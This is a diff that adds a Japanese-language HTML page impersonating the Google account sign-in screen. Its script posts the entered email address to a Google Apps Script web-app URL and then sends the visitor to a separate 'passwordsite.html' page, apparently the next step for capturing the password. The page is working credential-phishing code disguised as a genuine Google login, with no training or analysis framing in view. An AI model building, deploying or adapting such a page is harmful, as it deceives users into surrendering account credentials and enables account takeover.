@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google ログイン</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .login-box { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); width: 100%; max-width: 400px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+        .logo span:nth-child(1) { color: #4285F4; } .logo span:nth-child(2) { color: #EA4335; } .logo span:nth-child(3) { color: #FBBC05; } .logo span:nth-child(4) { color: #4285F4; } .logo span:nth-child(5) { color: #34A853; } .logo span:nth-child(6) { color: #EA4335; }
+        h1 { font-size: 24px; margin-bottom: 8px; font-weight: 400; }
+        p { font-size: 16px; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .footer-buttons { display: flex; justify-content: flex-end; align-items: center; margin-top: 30px; }
+        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        .next-btn:hover { background-color: #1557b0; }
+    </style>
+</head>
+<body>
+<div class="login-box">
+    <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+    <h1>ログイン</h1>
+    <p>Google アカウントを使用</p>
+    <form id="myForm">
+        <div class="input-group">
+            <input type="text" name="message" id="message" placeholder="メールアドレスまたは電話番号" required>
+        </div>
+        <div class="footer-buttons">
+            <button type="submit" class="next-btn">次へ</button>
+        </div>
+    </form>
+</div>
+<script>
+    const form = document.getElementById('myForm');
+    const gasUrl = "https://script.google.com/macros/s/AKfycbwQACHMsMN0kFJF5TpGHnZJ2DWdRC28KOz0cVG5tzyYwK_kppJOEha7BEKq6RvpmBqk/exec";
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const emailValue = document.getElementById('message').value;
+        const formData = new FormData(form);
+
+        fetch(gasUrl, { method: "POST", body: formData, mode: "no-cors" });
+
+        setTimeout(() => {
+            // パスワード画面へメールアドレスを渡して遷移
+            window.location.href = "./passwordsite.html?email=" + encodeURIComponent(emailValue);
+        }, 500);
+    });
+</script>
+</body>
+</html>
